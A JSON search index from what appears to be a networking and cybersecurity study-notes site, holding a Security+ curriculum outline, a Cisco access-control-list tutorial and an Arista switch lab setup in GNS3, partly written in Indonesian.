FUNCTIONAL RECOVERY PLANS kuis 19 Implementing Cybersecurity Resilience \u00b6 Implement Redundancy Strategies HIGH AVAILABILITY POWER REDUNDANCY NETWORK REDUNDANCY DISK REDUNDANCY GEOGRAPHICAL REDUNDANCY AND REPLICATION Implement Backup Strategies BACKUPS AND RETENTION POLICY BACKUP TYPES SNAPSHOTS AND IMAGES BACKUP STORAGE ISSUES BACKUP MEDIA TYPES RESTORATION ORDER And NONPERSISTENCE Implement Cybersecurity Resiliency Strategies CONFIGURATION MANAGEMENT ASSET MANAGEMENT CHANGE CONTROL AND CHANGE MANAGEMENT SITE RESILIENCY DIVERSITY AND DEFENSE IN DEPTH DECEPTION AND DISRUPTION STRATEGIES Lab 20: Implement Redundancy Strategies (PBQ) kuis 20 Explaining Physical Security \u00b6 Explain the Importance of Physical Site Security Controls SITE LAYOUT, FENCING, AND LIGHTING GATEWAYS AND LOCKS PHYSICAL ATTACKS AGAINST SMART CARDS AND USB ALARM SYSTEMS AND SENSORS SECURITY GUARDS AND CAMERAS RECEPTION PERSONNEL AND ID BADGES Explain the Importance of Physical Host Security Controls SECURE AREAS PROTECTED DISTRIBUTION AND FARADAY CAGES HEATING, VENTILATION, AIR CONDITIONING HOT AND COLD AISLES FIRE DETECTION AND SUPPRESSION SECURE DATA DESTRUCTION DATA SANITIZATION TOOLS kuis 21 Reviews (86)","title":"Security +"},{"location":"cybersecurity/securityp/#kurikulum","text":"","title":"Kurikulum"},{"location":"cybersecurity/securityp/#comparing-security-roles-and-security-controls","text":"Compare and Contrast Information Security Roles Cybersecurity Framework Information Security Competencies Information Security Roles and Responsibilities Information Security Business Units Compare and Contrast Security Control And Framework Types Security Control Categories Security Control Functional Types NIST Cybersecurity Framework ISO and Cloud Frameworks Benchmarks and Secure Configuration Guides Regulations, Standards, and Legislation Lab 1 - Compare and Contrast Security Control and Framework Types (PBQ) kuis 01","title":"Comparing Security Roles and Security Controls"},{"location":"cybersecurity/securityp/#explaining-threat-actors-and-threat-intelligence","text":"Explain Threat Actor Types and Attack Vectors Attributes of Threat Actors Hackers, Script Kiddies, and Hacktivists State Actors and Advanced Persistent Threats Criminal Syndicates and Competitors Insider Threat Actors Attack Surface and Attack Vectors Explain Threat Intelligence Sources Threat Research Sources Threat Intelligence Providers Other Threat Intelligence Research Sources Tactics, Techniques, and Procedures and Indicators of Compromise Threat Data Feeds Artificial Intelligence and Predictive Analysis kuis 02","title":"Explaining Threat Actors and Threat Intelligence"},{"location":"cybersecurity/securityp/#performing-security-assessment","text":"Assess Organizational Security with Network Reconnaissance Tools ipconfig, ping, and ARP route and traceroute IP Scanners and Nmap Service Discovery and Nmap netstat and nslookup Other Reconnaissance and Discovery Tools Packet Capture and tcpdump Packet Analysis and Wireshark Packet Injection and Replay Exploitation Frameworks Netcat Explain Security Concerns with General Vulnerability Types Zero-day and Legacy Platform Vulnerabilities Weak Host Configurations Weak Network Configurations Impacts from Vulnerabilities Third-Party Risks Summarize Vulnerability Scanning Techniques Vulnerability Scan Types Common Vulnerabilities and Exposures Intrusive versus Non-intrusive Scanning Credentialed versus Non-Credentialed Scanning False Positives, False Negatives, and Log Review Configuration Review Threat Hunting Explain Penetration Testing Concepts Rules of Engagement Exercise Types Passive and Active Reconnaissance Pen Test Attack Life Cycle Lab 3: Assess Organizational Security with Network Reconnaissance Tools (PBQ) kuis 03","title":"Performing Security Assessment"},{"location":"cybersecurity/securityp/#identifying-social-engineering-and-malware","text":"Compare and Contrast Social Engineering Techniques Social Engineering Principles Impersonation and Trust Dumpster Diving and Tailgating Identity Fraud and Invoice Scams Phishing, Whaling, and Vishing Spam, Hoaxes, and Prepending Pharming and Credential Harvesting Influence Campaigns Analyze Indicators of Malware-Based Attacks Malware Classification Computer Viruses Computer Worms and Fileless Malware Spyware and Keyloggers Backdoors and Remote Access Trojans Rootkits Ransomware, Crypto-Malware, and Logic Bombs Malware Indicators Process Analysis Lab 4: Analyze Indicators of Malware-Based Attacks (PBQ) kuis 04","title":"Identifying Social Engineering and Malware"},{"location":"cybersecurity/securityp/#summarizing-basic-cryptographic-concepts","text":"Compare and Contrast Cryptographic Ciphers Cryptographic Concepts Hashing Algorithms Encryption Ciphers and Keys Symmetric Encryption Stream and Block Ciphers Asymmetric Encryption Public Key Cryptography Algorithms Summarize Cryptographic Modes of Operation Digital Signatures Digital Envelopes and Key Exchange Digital Certificates Perfect Forward Secrecy Cipher Suites and Modes of Operation Authenticated Modes of Operation Summarize Cryptographic Use Cases and Weaknesses Cryptography Supporting Authentication and Non-repudiation Cryptography Supporting Confidentiality Cryptography Supporting Integrity and Resiliency Cryptographic Performance Limitations Cryptographic Security Limitations Longevity and Cryptographic Attacks Man-in-the-Middle and Downgrade Attacks Key Stretching and Salting Collisions and the Birthday Attack Summarize Other Cryptographic Technologies Quantum and Post-quantum Homomorphic Encryption Steganography kuis 05","title":"Summarizing Basic Cryptographic Concepts"},{"location":"cybersecurity/securityp/#implementing-public-key-infrastructure","text":"Implement Certificates and Certificate Authorities Public and Private Key Usage Certificate Authorities PKI Trust Models Registration Authorities and CSRs Digital Certificates Certificate Attributes Subject Name Attributes Types of Certificate Web Server Certificate Types Other Certificate Types Implement PKI Management Certificate and Key Management Key Recovery and Escrow Certificate Expiration Certificate Revocation Lists Online Certificate Status Protocol Responders Certificate Pinning Certificate Formats OpenSSL Certificate Issues Lab 6: Implement Certificates and Certificate Authorities (PBQ) kuis 06","title":"Implementing Public Key Infrastructure"},{"location":"cybersecurity/securityp/#implementing-authentication-controls","text":"Summarize Authentication Design Concepts Identity and Access Management Authentication Factors Authentication Design Multifactor Authentication Authentication Attributes Implement Knowledge-Based Authentication Local, Network, and Remote Authentication Kerberos Authentication Kerberos Authorization PAP, CHAP, and MS-CHAP Authentication Password Attacks Brute Force and Dictionary Attacks Password Crackers Authentication Management Implement Authentication Technologies Key Management Devices Extensible Authentication Protocol/IEEE 802.1X Remote Authentication Dial-in User Service Terminal Access Controller Access-Control System Token Keys and Static Codes Open Authentication 2-Step Verification Summarize Biometrics Authentication Concepts Fingerprint Recognition Facial Recognition Behavioral Technologies Lab 7: Implement Knowledge-Based Authentication (PBQ) kuis 07","title":"Implementing Authentication Controls"},{"location":"cybersecurity/securityp/#implementing-identity-and-account-management-controls","text":"Implement Identity and Account Types Identity Management Controls Background Check and Onboarding Policies Personnel Policies for Privilege Management Offboarding Policies Security Account Types and Credential Management Security Group-Based Privileges Administrator/Root Accounts Service Accounts Shared/Generic/Device Accounts and Credentials Secure Shell Keys and Third-party Credentials Implement Account Policies Account Attributes and Access Policies Account Password Policy Settings Account Restrictions Account Audits Account Permissions Usage Audits Account Lockout and Disablement Implement Authorization Solutions Discretionary and Role-Based Access Control File System Permissions Mandatory and Attribute-Based Access Control Rule-Based Access Control Directory Services Federation and Attestation Security Assertions Markup Language OAuth and OpenID Connect Explain the Importance of Personnel Policies Conduct Policies User and Role-based Training Diversity of Training Techniques Lab 8: Implement Identity and Account Types; Implement Account Policies (PBQ) kuis 08","title":"Implementing Identity and Account Management Controls"},{"location":"cybersecurity/securityp/#implementing-secure-network-designs","text":"Environment Lab Preparation [ID] Implement Secure Network Designs Business Workflows and Network Architecture Network Appliances Routing and Switching Protocols Network Segmentation Network Topology and Zones Demilitarized Zones Demilitarized Zone Topologies Screened Hosts Implications of IPv6 Other Secure Network Design Considerations Implement Secure Switching and Routing Man-in-the-Middle and Layer 2 Attacks ARP Poisoning and MAC Flooding Attacks Loop Prevention Physical Port Security and MAC Filtering Network Access Control Route Security Implement Secure Wireless Infrastructure Wireless Network Installation Considerations Controller and Access Point Security Wi-Fi Protected Access Wi-Fi Authentication Methods Wi-Fi Protected Setup Open Authentication and Captive Portals Enterprise/IEEE 802.1X Authentication Extensible Authentication Protocol PEAP, EAP-TTLS, and EAP-FAST RADIUS Federation Rogue Access Points and Evil Twins Disassociation and Replay Attacks Jamming Attacks Implement Load Balancers Distributed Denial of Service Attacks Amplification, Application, and OT Attacks Distributed Denial of Service Attack Mitigation Load Balancing Clustering Quality of Service (QoS) Lab 9: Implement Secure Switching and Routing (PBQ) Lab 9.1: Firewall NAT Rules kuis 09","title":"Implementing Secure Network Designs"},{"location":"cybersecurity/securityp/#implementing-network-security-appliances","text":"Implement Firewalls and Proxy Servers Packet Filtering Firewalls Stateful Inspection Firewalls iptables Firewall Implementation Proxies and Gateways Access Control Lists Network Address Translation Virtual Firewalls Open-source versus Proprietary Firewalls Implement Network Security Monitoring Network-Based Intrusion Detection Systems TAPs and Port Mirrors Network-Based Intrusion Prevention Systems Signature-Based Detection Behavior and Anomaly-Based Detection Next-generation Firewalls and Content Filters Host-Based Intrusion Detection Systems Web Application Firewalls Summarize the Use of SIEM Monitoring Services Security Information and Event Management Analysis and Report Review File Manipulation Regular Expressions and grep Lab 10: Implement Firewalls and Proxy Servers (PBQ) Lab 10.1: Intrusion Detection/Prevention System [ID] kuis 10","title":"Implementing Network Security Appliances"},{"location":"cybersecurity/securityp/#implementing-secure-network-protocols","text":"Implement Secure Network Operations Protocols DOMAIN NAME RESOLUTION DNS POISONING DNS SECURITY SECURE DIRECTORY SERVICES TIME SYNCHRONIZATION Implement Secure Application Protocols TRANSPORT LAYER SECURITY API CONSIDERATIONS FILE TRANSFER SERVICES EMAIL SERVICES SECURE/MULTIPURPOSE INTERNET MAIL EXTENSIONS VOICE AND VIDEO SERVICES Implement Secure Remote Access Protocols TRANSPORT LAYER SECURITY VPN INTERNET PROTOCOL SECURITY IPSEC TRANSPORT AND TUNNEL MODES INTERNET KEY EXCHANGE LAYER 2 TUNNELING PROTOCOL AND IKE V2 VPN CLIENT CONFIGURATION REMOTE DESKTOP OUT-OF-BAND MANAGEMENT AND JUMP SERVERS SECURE SHELL Lab 11: Implement Secure Remote Access Protocols (PBQ) kuis 11","title":"Implementing Secure Network Protocols"},{"location":"cybersecurity/securityp/#implementing-host-security-solutions","text":"Implement Secure Firmware HARDWARE ROOT OF TRUST BOOT INTEGRITY DISK ENCRYPTION USB AND FLASH DRIVE SECURITY THIRD-PARTY RISK MANAGEMENT END OF LIFE SYSTEMS Implement Endpoint Security BASELINE CONFIGURATION AND REGISTRY SETTINGS PATCH MANAGEMENT ENDPOINT PROTECTION NEXT-GENERATION ENDPOINT PROTECTION ANTIVIRUS RESPONSE Explain Embedded System Security Implications LOGIC CONTROLLERS FOR EMBEDDED SYSTEMS EMBEDDED SYSTEMS COMMUNICATIONS CONSIDERATIONS INDUSTRIAL CONTROL SYSTEMS INTERNET OF THINGS SPECIALIZED SYSTEMS FOR FACILITY AUTOMATION SPECIALIZED SYSTEMS IN IT SPECIALIZED SYSTEMS FOR VEHICLES AND DRONES SECURITY FOR EMBEDDED SYSTEMS kuis 12","title":"Implementing Host Security Solutions"},{"location":"cybersecurity/securityp/#implementing-secure-mobile-solutions","text":"Implement Mobile Device Management ENTERPRISE MOBILITY MANAGEMENT IOS IN THE ENTERPRISE ANDROID IN THE ENTERPRISE MOBILE ACCESS CONTROL SYSTEMS REMOTE WIPE LOCATION SERVICES APPLICATION MANAGEMENT CONTENT MANAGEMENT Implement Secure Mobile Device Connections CELLULAR AND GPS CONNECTION METHODS WI-FI AND TETHERING CONNECTION METHODS BLUETOOTH CONNECTION METHODS INFRARED AND RFID CONNECTION METHODS NEAR FIELD COMMUNICATIONS AND MOBILE PAYMENT SERVICES USB CONNECTION METHODS FIRMWARE OVER-THE-AIR UPDATES Lab 13: Implement Mobile Device Management (PBQ) kuis 13","title":"Implementing Secure Mobile Solutions"},{"location":"cybersecurity/securityp/#summarizing-secure-application-concepts","text":"Analyze Indicators of Application Attacks APPLICATION ATTACKS OVERFLOW VULNERABILITIES NULL POINTER DEREFERENCING AND RACE CONDITIONS MEMORY LEAKS AND RESOURCE EXHAUSTION DLL INJECTION AND DRIVER MANIPULATION PASS THE HASH ATTACK Analyze Indicators of Web Application Attacks UNIFORM RESOURCE LOCATOR ANALYSIS APPLICATION PROGRAMMING INTERFACE ATTACKS REPLAY ATTACKS SESSION HIJACKING AND CROSS-SITE REQUEST FORGERY CROSS-SITE SCRIPTING STRUCTURED QUERY LANGUAGE INJECTION ATTACKS XML AND LDAP INJECTION ATTACKS DIRECTORY TRAVERSAL AND COMMAND INJECTION ATTACKS SERVER-SIDE REQUEST FORGERY Summarize Secure Coding Practices SECURE CODING TECHNIQUES SERVER-SIDE VERSUS CLIENT-SIDE VALIDATION DATA EXPOSURE AND MEMORY MANAGEMENT SECURE CODE USAGE STATIC CODE ANALYSIS Implement Secure Script Environments SCRIPTING PYTHON SCRIPT ENVIRONMENT POWERSHELL SCRIPT ENVIRONMENT EXECUTION CONTROL MALICIOUS CODE INDICATORS POWERSHELL MALICIOUS INDICATORS BASH AND PYTHON MALICIOUS INDICATORS MACROS AND VISUAL BASIC FOR APPLICATIONS (VBA) MAN-IN-THE-BROWSER ATTACK Summarize Deployment and Automation Concepts SECURE APPLICATION DEVELOPMENT ENVIRONMENTS PROVISIONING, DEPROVISIONING, AND VERSION CONTROL AUTOMATION/SCRIPTING RELEASE PARADIGMS SOFTWARE DIVERSITY Lab 14: Implement Secure Script Environments (PBQ) Lab 14.1: Enkripsi Disk dengan Linux Unified Key Setup (LUKS) kuis 14","title":"Summarizing Secure Application Concepts"},{"location":"cybersecurity/securityp/#implementing-secure-cloud-solutions","text":"Summarize Secure Cloud and Virtualization Services CLOUD DEPLOYMENT MODELS CLOUD SERVICE MODELS ANYTHING AS A SERVICE SECURITY AS A SERVICE VIRTUALIZATION TECHNOLOGIES AND HYPERVISOR TYPES VIRTUAL DESKTOP INFRASTRUCTURE AND THIN CLIENTS APPLICATION VIRTUALIZATION AND CONTAINER VIRTUALIZATION VM ESCAPE PROTECTION VM SPRAWL AVOIDANCE Apply Cloud Security Solutions CLOUD SECURITY INTEGRATION AND AUDITING CLOUD SECURITY CONTROLS CLOUD COMPUTE SECURITY CLOUD STORAGE SECURITY HIGH AVAILABILITY CLOUD NETWORKING SECURITY VPCS AND TRANSIT GATEWAYS VPC ENDPOINTS CLOUD FIREWALL SECURITY SECURITY GROUPS CLOUD ACCESS SECURITY BROKERS Summarize Infrastructure as Code Concepts SERVICES INTEGRATION AND MICROSERVICES APPLICATION PROGRAMMING INTERFACES SERVERLESS ARCHITECTURE INFRASTRUCTURE AS CODE SOFTWARE-DEFINED NETWORKING SOFTWARE-DEFINED VISIBILITY FOG AND EDGE COMPUTING Lab 15: Apply Cloud Security Solutions (PBQ) Lab 15.1: Linux Security Assessment Dengan OpenSCAP kuis 15","title":"Implementing Secure Cloud Solutions"},{"location":"cybersecurity/securityp/#explaining-data-privacy-and-protection-concepts","text":"Explain Privacy and Data Sensitivity Concepts PRIVACY AND SENSITIVE DATA CONCEPTS DATA ROLES AND RESPONSIBILITIES DATA CLASSIFICATIONS DATA TYPES PRIVACY NOTICES AND DATA RETENTION DATA SOVEREIGNTY AND GEOGRAPHICAL CONSIDERATIONS PRIVACY BREACHES AND DATA BREACHES DATA SHARING AND PRIVACY TERMS OF AGREEMENT Explain Privacy and Data Protection Controls DATA PROTECTION DATA EXFILTRATION DATA LOSS PREVENTION RIGHTS MANAGEMENT SERVICES PRIVACY ENHANCING TECHNOLOGIES DATABASE DEIDENTIFICATION METHODS Lab 16: Explain Privacy and Data Sensitivity Concepts (PBQ) kuis 16","title":"Explaining Data Privacy and Protection Concepts"},{"location":"cybersecurity/securityp/#performing-incident-response","text":"Summarize Incident Response Procedures INCIDENT RESPONSE PROCESS CYBER INCIDENT RESPONSE TEAM COMMUNICATION PLAN AND STAKEHOLDER MANAGEMENT INCIDENT RESPONSE PLAN CYBER KILL CHAIN ATTACK FRAMEWORK OTHER ATTACK FRAMEWORKS INCIDENT RESPONSE EXERCISES INCIDENT RESPONSE, DISASTER RECOVERY, AND RETENTION POLICY Utilize Appropriate Data Sources for Incident Response INCIDENT IDENTIFICATION SECURITY AND INFORMATION EVENT MANAGEMENT SIEM DASHBOARDS TREND ANALYSIS LOGGING PLATFORMS NETWORK, OS, AND SECURITY LOG FILES APPLICATION LOG FILES METADATA NETWORK DATA SOURCES Apply Mitigation Controls INCIDENT CONTAINMENT INCIDENT ERADICATION AND RECOVERY FIREWALL CONFIGURATION CHANGES CONTENT FILTER CONFIGURATION CHANGES ENDPOINT CONFIGURATION CHANGES SECURITY ORCHESTRATION, AUTOMATION, AND RESPONSE ADVERSARIAL ARTIFICIAL INTELLIGENCE Lab 17: Summarize Incident Response Procedures (PBQ) kuis 17","title":"Performing Incident Response"},{"location":"cybersecurity/securityp/#explaining-digital-forensics","text":"Explain Key Aspects of Digital Forensics Documentation KEY ASPECTS OF DIGITAL FORENSICS DIGITAL FORENSICS REPORTS AND E-DISCOVERY VIDEO AND WITNESS INTERVIEWS TIMELINES EVENT LOGS AND NETWORK TRAFFIC STRATEGIC INTELLIGENCE AND COUNTERINTELLIGENCE Explain Key Aspects of Digital Forensics Evidence Acquisition DATA ACQUISITION AND ORDER OF VOLATILITY DIGITAL FORENSICS SOFTWARE SYSTEM MEMORY ACQUISITION DISK IMAGE ACQUISITION PRESERVATION AND INTEGRITY OF EVIDENCE ACQUISITION OF OTHER DATA DIGITAL FORENSICS FOR CLOUD kuis 18","title":"Explaining Digital Forensics"},{"location":"cybersecurity/securityp/#summarizing-risk-management-concepts","text":"Explain Risk Management Processes and Concepts RISK MANAGEMENT PROCESSES RISK TYPES QUANTITATIVE RISK ASSESSMENT QUALITATIVE RISK ASSESSMENT RISK MANAGEMENT STRATEGIES RISK AVOIDANCE AND RISK TRANSFERENCE RISK ACCEPTANCE AND RISK APPETITE RISK AWARENESS Explain Business Impact Analysis Concepts MISSION ESSENTIAL FUNCTIONS IDENTIFICATION OF CRITICAL SYSTEMS SINGLE POINTS OF FAILURE DISASTERS DISASTER RECOVERY PLANS And FUNCTIONAL RECOVERY PLANS kuis 19","title":"Summarizing Risk Management Concepts"},{"location":"cybersecurity/securityp/#implementing-cybersecurity-resilience","text":"Implement Redundancy Strategies HIGH AVAILABILITY POWER REDUNDANCY NETWORK REDUNDANCY DISK REDUNDANCY GEOGRAPHICAL REDUNDANCY AND REPLICATION Implement Backup Strategies BACKUPS AND RETENTION POLICY BACKUP TYPES SNAPSHOTS AND IMAGES BACKUP STORAGE ISSUES BACKUP MEDIA TYPES RESTORATION ORDER And NONPERSISTENCE Implement Cybersecurity Resiliency Strategies CONFIGURATION MANAGEMENT ASSET MANAGEMENT CHANGE CONTROL AND CHANGE MANAGEMENT SITE RESILIENCY DIVERSITY AND DEFENSE IN DEPTH DECEPTION AND DISRUPTION STRATEGIES Lab 20: Implement Redundancy Strategies (PBQ) kuis 20","title":"Implementing Cybersecurity Resilience"},{"location":"cybersecurity/securityp/#explaining-physical-security","text":"Explain the Importance of Physical Site Security Controls SITE LAYOUT, FENCING, AND LIGHTING GATEWAYS AND LOCKS PHYSICAL ATTACKS AGAINST SMART CARDS AND USB ALARM SYSTEMS AND SENSORS SECURITY GUARDS AND CAMERAS RECEPTION PERSONNEL AND ID BADGES Explain the Importance of Physical Host Security Controls SECURE AREAS PROTECTED DISTRIBUTION AND FARADAY CAGES HEATING, VENTILATION, AIR CONDITIONING HOT AND COLD AISLES FIRE DETECTION AND SUPPRESSION SECURE DATA DESTRUCTION DATA SANITIZATION TOOLS kuis 21 Reviews (86)","title":"Explaining Physical Security"},{"location":"cybersecurity/securityp/modul1/","text":"Comparing Security Roles and Security Controls \u00b6","title":"Comparing Security Roles and Security Controls"},{"location":"cybersecurity/securityp/modul1/#comparing-security-roles-and-security-controls","text":"","title":"Comparing Security Roles and Security Controls"},{"location":"cybersecurity/tsa-cyberops/nsi/","text":"Network Security Infrastructure \u00b6 Topology Diagrams \u00b6 Physical topology, mengilustrasikan lokasi fisik dari perantara perangkat dan instalasi kabel. seperti pembagian berdasarkan ruangan Logical topology, mengilustrasikan perangkat, port, dan skema address jaringan. seperti pembagian berdasar network Network Topologies \u00b6 Desain LAN terdapat 3 layer: Access: menyediakan endpoint user ke jaringan Distribution: agregasi layer akses dan menyediakan konektifitas ke servis","title":"Network Security Infrastructure"},{"location":"cybersecurity/tsa-cyberops/nsi/#network-security-infrastructure","text":"","title":"Network Security Infrastructure"},{"location":"cybersecurity/tsa-cyberops/nsi/#topology-diagrams","text":"Physical topology, mengilustrasikan lokasi fisik dari perantara perangkat dan instalasi kabel. seperti pembagian berdasarkan ruangan Logical topology, mengilustrasikan perangkat, port, dan skema address jaringan. seperti pembagian berdasar network","title":"Topology Diagrams"},{"location":"cybersecurity/tsa-cyberops/nsi/#network-topologies","text":"Desain LAN terdapat 3 layer: Access: menyediakan endpoint user ke jaringan Distribution: agregasi layer akses dan menyediakan konektifitas ke servis","title":"Network Topologies"},{"location":"jarkom/","text":"Jaringan Komputer \u00b6 sementara dapat diakses melalui old wetofu","title":"Intro"},{"location":"jarkom/#jaringan-komputer","text":"sementara dapat diakses melalui old wetofu","title":"Jaringan Komputer"},{"location":"jarkom/acl/","text":"Access Control List \u00b6 ACL merupakan filtering paket data pada router. Bekerja pada layer 3 (Network) Tipe ACL pada Cisco router: - Standard IP - Extended IP - IPX - AppleTalk ACL number deskripsi 1 - 99 IP standard ACL 100 - 199 IP extended ACL 200 - 299 Protocol type code ACL 300 - 399 DECnet ACL 400 - 499 Xeroc Network Systems standard ACL 500 - 599 XNS extended ACL 600 - 699 AppleTalk ACL 700 - 799 48-bit MAC address ACL 800 - 899 Internetwork Packet Exchange standard ACL 900 - 999 IPX extended ACL 1000 - 1099 IPX service advertisement protocol ACL 1100 - 1199 Extended 48-bit MAC address ACL 1200 - 1299 IPX summary address ACL 1300 - 1999 IP standard ACL (expanded range) 2000 - 2699 IP extended ACL (expanded range) aturan menggunakan ACL: per-protocol per-interface per-direction Router(config)# access-list [acl_number] permit|deny [ip_protocol] source_address source_wildcard_mask [source_protocol_information] destination_address destination_wildcard_mask [destination_protocol_information] [log] Standard IP ACL \u00b6 dapat digunakan untuk menyeleksi source IP dari paket yang datang, sedangkan destination dan port tidak dapat difilter Router(config)# access-list 20 permit 192.168.1.0 0.0.0.255 perintah diatas mengizinkan trafik dari IP 192.168.1.0 - 192.168.1.255 Router#show access-lists 20 Standard IP access list 20 10 permit 192.168.1.0, wildcard bits 0.0.0.255 Extended IP ACL \u00b6 dapat digunakan untuk menyeleksi source/destination IP dan port Router(config)# access-list 101 permit tcp 65.35.9.0 0.0.0.255 any eq 80 perintah diatas mengizinkan semua perangkat dari network 65.35.9.0 mengakses web server internet (port 80) ACL perlu didefinisikan incoming dan outgouing traffic, dapat dilakukan dengan menambahkan ACL baru Router(config)# access-list 102 permit tcp any 65.35.9.0 0.0.0.255 established Mengaktifkan ACL \u00b6 Router(config)#int f0/0 Router(config-if)#ip access-group 20 out Router(config-if)#ip access-group 30 in perintah diatas mengaktifkan ACL 20 (outgoing), dan ACL 30 (incoming) pada interface f0/0 Menampilkan ACL \u00b6 Router#show access-lists Router#show access-lists 30 Router#show access-lists complied Router#show ip access-lists menampilkan ACL yang sudah diberi nama Router#show ip access-lists HTTP_in Menghapus ACL \u00b6 Router#no access-list 20 menghapus ACL yang sudah diberi nama Router(config)#ip access-list extended BLOCK_WS03 Router(config-ext-nacl)#no 20","title":"Access Control List"},{"location":"jarkom/acl/#access-control-list","text":"ACL merupakan filtering paket data pada router. Bekerja pada layer 3 (Network) Tipe ACL pada Cisco router: - Standard IP - Extended IP - IPX - AppleTalk ACL number deskripsi 1 - 99 IP standard ACL 100 - 199 IP extended ACL 200 - 299 Protocol type code ACL 300 - 399 DECnet ACL 400 - 499 Xeroc Network Systems standard ACL 500 - 599 XNS extended ACL 600 - 699 AppleTalk ACL 700 - 799 48-bit MAC address ACL 800 - 899 Internetwork Packet Exchange standard ACL 900 - 999 IPX extended ACL 1000 - 1099 IPX service advertisement protocol ACL 1100 - 1199 Extended 48-bit MAC address ACL 1200 - 1299 IPX summary address ACL 1300 - 1999 IP standard ACL (expanded range) 2000 - 2699 IP extended ACL (expanded range) aturan menggunakan ACL: per-protocol per-interface per-direction Router(config)# access-list [acl_number] permit|deny [ip_protocol] source_address source_wildcard_mask [source_protocol_information] destination_address destination_wildcard_mask [destination_protocol_information] [log]","title":"Access Control List"},{"location":"jarkom/acl/#standard-ip-acl","text":"dapat digunakan untuk menyeleksi source IP dari paket yang datang, sedangkan destination dan port tidak dapat difilter Router(config)# access-list 20 permit 192.168.1.0 0.0.0.255 perintah diatas mengizinkan trafik dari IP 192.168.1.0 - 192.168.1.255 Router#show access-lists 20 Standard IP access list 20 10 permit 192.168.1.0, wildcard bits 0.0.0.255","title":"Standard IP ACL"},{"location":"jarkom/acl/#extended-ip-acl","text":"dapat digunakan untuk menyeleksi source/destination IP dan port Router(config)# access-list 101 permit tcp 65.35.9.0 0.0.0.255 any eq 80 perintah diatas mengizinkan semua perangkat dari network 65.35.9.0 mengakses web server internet (port 80) ACL perlu didefinisikan incoming dan outgouing traffic, dapat dilakukan dengan menambahkan ACL baru Router(config)# access-list 102 permit tcp any 65.35.9.0 0.0.0.255 established","title":"Extended IP ACL"},{"location":"jarkom/acl/#mengaktifkan-acl","text":"Router(config)#int f0/0 Router(config-if)#ip access-group 20 out Router(config-if)#ip access-group 30 in perintah diatas mengaktifkan ACL 20 (outgoing), dan ACL 30 (incoming) pada interface f0/0","title":"Mengaktifkan ACL"},{"location":"jarkom/acl/#menampilkan-acl","text":"Router#show access-lists Router#show access-lists 30 Router#show access-lists complied Router#show ip access-lists menampilkan ACL yang sudah diberi nama Router#show ip access-lists HTTP_in","title":"Menampilkan ACL"},{"location":"jarkom/acl/#menghapus-acl","text":"Router#no access-list 20 menghapus ACL yang sudah diberi nama Router(config)#ip access-list extended BLOCK_WS03 Router(config-ext-nacl)#no 20","title":"Menghapus ACL"},{"location":"jarkom/arista/","text":"Arista \u00b6 tutorial akan dilakukan dengan GNS3, lihat proses instalasi GNS3 dan Arista user manual arista dapat dilihat dari official pdf Konfigurasi \u00b6 Start kedua mesin dan buka console login admin : (no password) pada saat awal akan ada tampilan ... To cancel Zero Touch Provisioning, login as admin and type 'zerotouch cancel' at the CLI. Alternatively, to disable Zero Touch Provisioning permanently, type 'zerotouch disable' at the CLI. Note: The device will reload when these commands are issued. ... localhost> Jul 11 04:19:20 localhost ZeroTouch: %ZTP-6-RETRY: Retrying Zero Touch Provisioning from the beginning (attempt 8) ... lakukan localhost> zerotouch cancel Pada tutorial ini akan membahasan praktik jaringan, jadi jika ingin mempelajari command-command arista dapat dipelajari melalui user manual arista Konfigurasi AristavEOS4.21.1F-1 localhost>enable localhost#configure terminal localhost(config)#host S1 S1(config)#int e1 S1(config-if-Et1)#no shut S1(config-if-Et1)#ip address 10.1.1.1 255.255.255.0 ! IP configuration will be ignored while interface Ethernet1 is not a routed port. S1(config-if-Et1)#no switchport S1(config-if-Et1)#ip address 10.1.1.1 255.255.255.0 Konfigurasi AristavEOS4.21.1F-2 localhost>enable localhost#configure terminal localhost(config)#host S2 S2(config)#int e1 S2(config-if-Et1)#no shut S2(config-if-Et1)#no switchport S2(config-if-Et1)#ip address 10.1.1.2 255.255.255.0 tes ping* S1(config)#ping 10.1.1.2 PING 10.1.1.2 (10.1.1.2) 72(100) bytes of data. 80 bytes from 10.1.1.2: icmp_seq=1 ttl=64 time=116 ms 80 bytes from 10.1.1.2: icmp_seq=2 ttl=64 time=116 ms 80 bytes from 10.1.1.2: icmp_seq=3 ttl=64 time=116 ms 80 bytes from 10.1.1.2: icmp_seq=4 ttl=64 time=120 ms 80 bytes from 10.1.1.2: icmp_seq=5 ttl=64 time=128 ms --- 10.1.1.2 ping statistics --- 5 packets transmitted, 5 received, 0% packet loss, time 48ms rtt min/avg/max/mdev = 116.007/119.207/128.008/4.675 ms, pipe 5, ipg/ewma 12.000/117.944 ms S2(config-if-Et1)#ping 10.1.1.1 PING 10.1.1.1 (10.1.1.1) 72(100) bytes of data. 80 bytes from 10.1.1.1: icmp_seq=1 ttl=64 time=144 ms 80 bytes from 10.1.1.1: icmp_seq=2 ttl=64 time=164 ms 80 bytes from 10.1.1.1: icmp_seq=3 ttl=64 time=184 ms 80 bytes from 10.1.1.1: icmp_seq=4 ttl=64 time=196 ms 80 bytes from 10.1.1.1: icmp_seq=5 ttl=64 time=196 ms --- 10.1.1.1 ping statistics --- 5 packets transmitted, 5 received, 0% packet loss, time 52ms rtt min/avg/max/mdev = 144.009/176.811/196.012/20.144 ms, pipe 5, ipg/ewma 13.000/161.700 ms","title":"Arista"},{"location":"jarkom/arista/#arista","text":"tutorial akan dilakukan dengan GNS3, lihat proses instalasi GNS3 dan Arista user manual arista dapat dilihat dari official pdf","title":"Arista"},{"location":"jarkom/arista/#konfigurasi","text":"Start kedua mesin dan buka console login admin : (no password) pada saat awal akan ada tampilan ... To cancel Zero Touch Provisioning, login as admin and type 'zerotouch cancel' at the CLI. Alternatively, to disable Zero Touch Provisioning permanently, type 'zerotouch disable' at the CLI. Note: The device will reload when these commands are issued. ... localhost> Jul 11 04:19:20 localhost ZeroTouch: %ZTP-6-RETRY: Retrying Zero Touch Provisioning from the beginning (attempt 8) ... lakukan localhost> zerotouch cancel Pada tutorial ini akan membahasan praktik jaringan, jadi jika ingin mempelajari command-command arista dapat dipelajari melalui user manual arista Konfigurasi AristavEOS4.21.1F-1 localhost>enable localhost#configure terminal localhost(config)#host S1 S1(config)#int e1 S1(config-if-Et1)#no shut S1(config-if-Et1)#ip address 10.1.1.1 255.255.255.0 ! IP configuration will be ignored while interface Ethernet1 is not a routed port. S1(config-if-Et1)#no switchport S1(config-if-Et1)#ip address 10.1.1.1 255.255.255.0 Konfigurasi AristavEOS4.21.1F-2 localhost>enable localhost#configure terminal localhost(config)#host S2 S2(config)#int 